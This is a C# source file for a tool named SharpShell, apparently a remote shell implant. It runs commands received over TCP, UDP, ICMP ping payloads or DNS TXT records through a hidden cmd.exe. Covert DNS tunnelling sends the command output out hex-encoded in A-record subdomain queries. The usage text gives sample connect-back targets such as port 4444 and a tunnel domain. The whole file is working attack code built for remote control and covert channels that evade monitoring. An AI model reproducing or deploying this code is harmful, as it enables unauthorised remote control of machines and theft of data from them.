using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SharpShell
{
    /// <summary>
    /// DNS query wrapper using Windows DNS API
    /// </summary>
    public class DnsResolver
    {
        #region P/Invoke Declarations

        [Flags]
        public enum DnsQueryOptions : uint
        {
            Standard = 0x0,
            AcceptTruncatedResponse = 0x1,
            UseTcpOnly = 0x2,
            NoRecursion = 0x4,
            BypassCache = 0x8,
            NoWireQuery = 0x10,
            NoLocalName = 0x20,
            NoHostsFile = 0x40,
            NoNetbt = 0x80,
            WireOnly = 0x100,
            ReturnMessage = 0x200,
            TreatAsFqdn = 0x1000,
            AddrConfig = 0x2000,
            DualAddr = 0x4000
        }

        public enum DnsFreeType
        {
            Flat = 0,
            RecordList = 1,
            ParsedMessageFields = 2
        }

        public enum DnsRecordType : ushort
        {
            A = 0x1,
            TXT = 0x10
        }

        [DllImport("dnsapi.dll", EntryPoint = "DnsQuery_W", CharSet = CharSet.Unicode, 
            SetLastError = true, ExactSpelling = true)]
        private static extern int DnsQuery(
            [MarshalAs(UnmanagedType.LPWStr)] string name,
            DnsRecordType type,
            DnsQueryOptions options,
            IntPtr extra,
            ref IntPtr results,
            IntPtr reserved);

        [DllImport("dnsapi.dll", EntryPoint = "DnsQuery_W", CharSet = CharSet.Unicode, 
            SetLastError = true, ExactSpelling = true)]
        private static extern int DnsQueryWithServer(
            [MarshalAs(UnmanagedType.LPWStr)] string name,
            DnsRecordType type,
            DnsQueryOptions options,
            ref IP4_ARRAY serverArray,
            ref IntPtr results,
            IntPtr reserved);

        [DllImport("dnsapi.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern void DnsRecordListFree(IntPtr recordList, DnsFreeType freeType);

        [StructLayout(LayoutKind.Sequential)]
        private struct IP4_ARRAY
        {
            public uint AddrCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public uint[] AddrArray;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct DNS_A_DATA
        {
            public uint IpAddress;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct DNS_TXT_DATA
        {
            public uint StringCount;
            public IntPtr StringArray;
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct DNS_RECORD_DATA
        {
            [FieldOffset(0)]
            public DNS_A_DATA A;
            [FieldOffset(0)]
            public DNS_TXT_DATA TXT;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct DNS_RECORD
        {
            public IntPtr Next;
            public IntPtr Name;
            public ushort Type;
            public ushort DataLength;
            public uint Flags;
            public uint Ttl;
            public uint Reserved;
            public DNS_RECORD_DATA Data;
        }

        #endregion

        public string DnsServerIp { get; set; } = string.Empty;

        /// <summary>
        /// Query DNS A records
        /// </summary>
        public List<string> QueryA(string domain)
        {
            IntPtr recordsArray = IntPtr.Zero;
            try
            {
                int result = string.IsNullOrEmpty(DnsServerIp)
                    ? DnsQuery(domain, DnsRecordType.A, DnsQueryOptions.BypassCache, 
                        IntPtr.Zero, ref recordsArray, IntPtr.Zero)
                    : QueryWithCustomServer(domain, DnsRecordType.A, ref recordsArray);

                if (result != 0) return null;

                return ParseARecords(recordsArray);
            }
            finally
            {
                if (recordsArray != IntPtr.Zero)
                    DnsRecordListFree(recordsArray, DnsFreeType.Flat);
            }
        }

        /// <summary>
        /// Query DNS TXT records
        /// </summary>
        public List<string> QueryTXT(string domain)
        {
            IntPtr recordsArray = IntPtr.Zero;
            try
            {
                int result = string.IsNullOrEmpty(DnsServerIp)
                    ? DnsQuery(domain, DnsRecordType.TXT, DnsQueryOptions.BypassCache, 
                        IntPtr.Zero, ref recordsArray, IntPtr.Zero)
                    : QueryWithCustomServer(domain, DnsRecordType.TXT, ref recordsArray);

                if (result != 0) return null;

                return ParseTxtRecords(recordsArray);
            }
            finally
            {
                if (recordsArray != IntPtr.Zero)
                    DnsRecordListFree(recordsArray, DnsFreeType.Flat);
            }
        }

        private int QueryWithCustomServer(string domain, DnsRecordType type, ref IntPtr recordsArray)
        {
            uint address = BitConverter.ToUInt32(IPAddress.Parse(DnsServerIp).GetAddressBytes(), 0);
            var serverArray = new IP4_ARRAY
            {
                AddrCount = 1,
                AddrArray = new[] { address }
            };
            return DnsQueryWithServer(domain, type, DnsQueryOptions.BypassCache, 
                ref serverArray, ref recordsArray, IntPtr.Zero);
        }

        private static List<string> ParseARecords(IntPtr recordsArray)
        {
            var results = new List<string>();
            for (IntPtr ptr = recordsArray; ptr != IntPtr.Zero;)
            {
                var record = Marshal.PtrToStructure<DNS_RECORD>(ptr);
                if (record.Type == (ushort)DnsRecordType.A)
                {
                    results.Add(new IPAddress(record.Data.A.IpAddress).ToString());
                }
                ptr = record.Next;
            }
            return results;
        }

        private static List<string> ParseTxtRecords(IntPtr recordsArray)
        {
            var results = new List<string>();
            for (IntPtr ptr = recordsArray; ptr != IntPtr.Zero;)
            {
                var record = Marshal.PtrToStructure<DNS_RECORD>(ptr);
                if (record.Type == (ushort)DnsRecordType.TXT)
                {
                    var txtData = Marshal.PtrToStringUni(record.Data.TXT.StringArray);
                    if (!string.IsNullOrEmpty(txtData))
                        results.Add(txtData);
                }
                ptr = record.Next;
            }
            return results;
        }
    }

    /// <summary>
    /// Command execution wrapper
    /// </summary>
    public static class CommandExecutor
    {
        private const int TimeoutSeconds = 30;

        public static async Task<string> RunCommandAsync(string command, 
            CancellationToken cancellationToken = default)
        {
            if (string.IsNullOrWhiteSpace(command))
                return string.Empty;

            try
            {
                using var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/C {command}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        WorkingDirectory = Environment.CurrentDirectory
                    }
                };

                var outputBuilder = new StringBuilder();
                var errorBuilder = new StringBuilder();

                process.OutputDataReceived += (_, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                        outputBuilder.AppendLine(e.Data);
                };

                process.ErrorDataReceived += (_, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                        errorBuilder.AppendLine(e.Data);
                };

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                using var timeoutCts = new CancellationTokenSource(TimeSpan.FromSeconds(TimeoutSeconds));
                using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(
                    cancellationToken, timeoutCts.Token);

                await Task.Run(() => process.WaitForExit(), linkedCts.Token);

                var output = outputBuilder.ToString();
                var error = errorBuilder.ToString();

                return !string.IsNullOrEmpty(output) ? output : error;
            }
            catch (OperationCanceledException)
            {
                return "Command execution timed out or was cancelled.\n";
            }
            catch (Exception ex)
            {
                return $"Error executing command: {ex.Message}\n";
            }
        }
    }

    /// <summary>
    /// TCP-based shell implementation
    /// </summary>
    public class TcpShell
    {
        private const string Prompt = "Command> ";
        private const int BufferSize = 8192;

        public static async Task RunAsync(string action, string ipAddress, int port, 
            CancellationToken cancellationToken = default)
        {
            TcpClient client = null;
            TcpListener listener = null;

            try
            {
                if (action.Equals("connect", StringComparison.OrdinalIgnoreCase))
                {
                    client = new TcpClient();
                    await client.ConnectAsync(ipAddress, port);
                }
                else if (action.Equals("listen", StringComparison.OrdinalIgnoreCase))
                {
                    listener = new TcpListener(IPAddress.Parse(ipAddress), port);
                    listener.Start();
                    client = await listener.AcceptTcpClientAsync();
                }

                await using var stream = client.GetStream();
                await HandleTcpSessionAsync(stream, cancellationToken);
            }
            finally
            {
                client?.Close();
                listener?.Stop();
            }
        }

        private static async Task HandleTcpSessionAsync(NetworkStream stream, 
            CancellationToken cancellationToken)
        {
            var buffer = new byte[BufferSize];

            await SendPromptAsync(stream, cancellationToken);

            while (!cancellationToken.IsCancellationRequested)
            {
                var bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length, cancellationToken);
                if (bytesRead == 0) break;

                var command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                if (command.Equals("exit", StringComparison.OrdinalIgnoreCase))
                    break;

                var result = await CommandExecutor.RunCommandAsync(command, cancellationToken);
                await SendDataAsync(stream, result, cancellationToken);
                await SendPromptAsync(stream, cancellationToken);
            }
        }

        private static async Task SendPromptAsync(NetworkStream stream, CancellationToken cancellationToken)
        {
            await SendDataAsync(stream, Prompt, cancellationToken);
        }

        private static async Task SendDataAsync(NetworkStream stream, string data, 
            CancellationToken cancellationToken)
        {
            var bytes = Encoding.UTF8.GetBytes(data);
            await stream.WriteAsync(bytes, 0, bytes.Length, cancellationToken);
            await stream.FlushAsync(cancellationToken);
        }
    }

    /// <summary>
    /// UDP-based shell implementation
    /// </summary>
    public class UdpShell
    {
        private const string Prompt = "Command> ";

        public static async Task RunAsync(string action, string ipAddress, int port, 
            CancellationToken cancellationToken = default)
        {
            using var client = new UdpClient(port);
            var endpoint = new IPEndPoint(IPAddress.Parse(ipAddress), port);

            if (action.Equals("listen", StringComparison.OrdinalIgnoreCase))
            {
                var result = await client.ReceiveAsync();
                endpoint = result.RemoteEndPoint;
            }

            await SendDataAsync(client, endpoint, Prompt);

            while (!cancellationToken.IsCancellationRequested)
            {
                var result = await client.ReceiveAsync();
                var command = Encoding.UTF8.GetString(result.Buffer).Trim();

                if (command.Equals("exit", StringComparison.OrdinalIgnoreCase))
                    break;

                var output = await CommandExecutor.RunCommandAsync(command, cancellationToken);
                await SendDataAsync(client, endpoint, output);
                await SendDataAsync(client, endpoint, Prompt);
            }
        }

        private static async Task SendDataAsync(UdpClient client, IPEndPoint endpoint, string data)
        {
            var bytes = Encoding.UTF8.GetBytes(data);
            await client.SendAsync(bytes, bytes.Length, endpoint);
        }
    }

    /// <summary>
    /// ICMP-based shell implementation
    /// </summary>
    public class IcmpShell
    {
        private const string Prompt = "Command> ";
        private const int BufferSize = 128;
        private const int TimeoutMs = 60000;

        public static async Task RunAsync(string ipAddress, CancellationToken cancellationToken = default)
        {
            using var pingSender = new Ping();
            var options = new PingOptions { DontFragment = true };

            await SendPingAsync(pingSender, ipAddress, Prompt, options);

            while (!cancellationToken.IsCancellationRequested)
            {
                var reply = await SendPingAsync(pingSender, ipAddress, string.Empty, options);
                
                if (reply?.Buffer == null || reply.Buffer.Length == 0)
                {
                    await Task.Delay(1000, cancellationToken);
                    continue;
                }

                var command = Encoding.UTF8.GetString(reply.Buffer).Trim();
                if (command.Equals("exit", StringComparison.OrdinalIgnoreCase))
                    break;

                var result = await CommandExecutor.RunCommandAsync(command, cancellationToken);
                await SendChunkedResponseAsync(pingSender, ipAddress, result, options, cancellationToken);
                await SendPingAsync(pingSender, ipAddress, Prompt, options);
            }
        }

        private static async Task<PingReply> SendPingAsync(Ping sender, string address, 
            string data, PingOptions options)
        {
            var buffer = Encoding.UTF8.GetBytes(data);
            return await sender.SendPingAsync(address, TimeoutMs, buffer, options);
        }

        private static async Task SendChunkedResponseAsync(Ping sender, string address, 
            string data, PingOptions options, CancellationToken cancellationToken)
        {
            var buffer = Encoding.UTF8.GetBytes(data);
            var chunks = buffer.Select((b, i) => new { Index = i, Value = b })
                              .GroupBy(x => x.Index / BufferSize)
                              .Select(g => g.Select(x => x.Value).ToArray());

            foreach (var chunk in chunks)
            {
                if (cancellationToken.IsCancellationRequested) break;
                await sender.SendPingAsync(address, TimeoutMs, chunk, options);
            }
        }
    }

    /// <summary>
    /// DNS-based shell implementation
    /// </summary>
    public class DnsShell
    {
        private static readonly Random Random = new Random();

        public static async Task RunAsync(string domain, string dnsServerIp, 
            CancellationToken cancellationToken = default)
        {
            var resolver = new DnsResolver { DnsServerIp = dnsServerIp };

            while (!cancellationToken.IsCancellationRequested)
            {
                var queryDomain = $"{Random.Next(1000, 9999)}{GenerateRandomString(8)}.{domain}";
                var txtRecords = resolver.QueryTXT(queryDomain);

                if (txtRecords == null || txtRecords.Count == 0)
                {
                    await Task.Delay(1000, cancellationToken);
                    continue;
                }

                var command = string.Join(" ", txtRecords).Trim();
                Console.WriteLine($"Received: {command}");

                if (command.StartsWith("nocmd", StringComparison.OrdinalIgnoreCase) || 
                    string.IsNullOrEmpty(command))
                    continue;

                if (command.StartsWith("exit", StringComparison.OrdinalIgnoreCase))
                    break;

                var result = await CommandExecutor.RunCommandAsync(command, cancellationToken);
                await ExfiltrateViaDnsAsync(resolver, result, domain);
            }
        }

        private static async Task ExfiltrateViaDnsAsync(DnsResolver resolver, string data, string domain)
        {
            var hexData = BitConverter.ToString(Encoding.UTF8.GetBytes(data)).Replace("-", "");
            const int chunkSize = 50;
            var chunks = Enumerable.Range(0, (int)Math.Ceiling(hexData.Length / (double)chunkSize))
                                   .Select(i => hexData.Substring(i * chunkSize, 
                                       Math.Min(chunkSize, hexData.Length - i * chunkSize)))
                                   .ToList();

            // Signal start
            resolver.QueryA($"{GenerateRandomString(8)}.CMDC{chunks.Count}.{domain}");

            // Send chunks
            for (int i = 0; i < chunks.Count; i++)
            {
                resolver.QueryA($"{GenerateRandomString(8)}.CMD{i}.{chunks[i]}.{domain}");
                await Task.Delay(100); // Rate limiting
            }

            // Signal end
            resolver.QueryA($"{GenerateRandomString(8)}.END.{domain}");
        }

        private static string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[Random.Next(s.Length)]).ToArray());
        }
    }

    /// <summary>
    /// Main program entry point
    /// </summary>
    class Program
    {
        static async Task<int> Main(string[] args)
        {
            if (args.Length == 0)
            {
                DisplayUsage();
                return 1;
            }

            using var cts = new CancellationTokenSource();
            Console.CancelKeyPress += (_, e) =>
            {
                e.Cancel = true;
                cts.Cancel();
            };

            try
            {
                var mode = args[0].ToLower();
                var action = args.Length > 1 ? args[1].ToLower() : null;

                return mode switch
                {
                    "tcp" when args.Length >= 4 => await RunTcpAsync(action, args[2], 
                        int.Parse(args[3]), cts.Token),
                    "udp" when args.Length >= 4 => await RunUdpAsync(action, args[2], 
                        int.Parse(args[3]), cts.Token),
                    "icmp" when args.Length >= 3 => await RunIcmpAsync(args[2], cts.Token),
                    "dns" when args.Length >= 3 => await RunDnsAsync(action, args, cts.Token),
                    _ => DisplayUsageAndExit()
                };
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                return 1;
            }
        }

        private static async Task<int> RunTcpAsync(string action, string ip, int port, 
            CancellationToken ct)
        {
            await TcpShell.RunAsync(action, ip, port, ct);
            return 0;
        }

        private static async Task<int> RunUdpAsync(string action, string ip, int port, 
            CancellationToken ct)
        {
            await UdpShell.RunAsync(action, ip, port, ct);
            return 0;
        }

        private static async Task<int> RunIcmpAsync(string ip, CancellationToken ct)
        {
            await IcmpShell.RunAsync(ip, ct);
            return 0;
        }

        private static async Task<int> RunDnsAsync(string action, string[] args, CancellationToken ct)
        {
            if (action == "direct" && args.Length >= 4)
            {
                await DnsShell.RunAsync(args[3], args[2], ct);
                return 0;
            }
            if (action == "recurse" && args.Length >= 3)
            {
                await DnsShell.RunAsync(args[2], string.Empty, ct);
                return 0;
            }
            return DisplayUsageAndExit();
        }

        private static int DisplayUsageAndExit()
        {
            DisplayUsage();
            return 1;
        }

        private static void DisplayUsage()
        {
            Console.WriteLine(@"
SharpShell - Network Shell Tool (2025 Edition)

Usage:
  SharpShell tcp listen <ip> <port>
  SharpShell tcp connect <ip> <port>
  SharpShell udp listen <ip> <port>
  SharpShell udp connect <ip> <port>
  SharpShell icmp connect <ip>
  SharpShell dns direct <dns-server> <domain>
  SharpShell dns recurse <domain>

Examples:
  SharpShell tcp listen 0.0.0.0 8080
  SharpShell tcp connect 192.168.1.100 4444
  SharpShell dns recurse tunnel.example.com
");
        }
    }
}
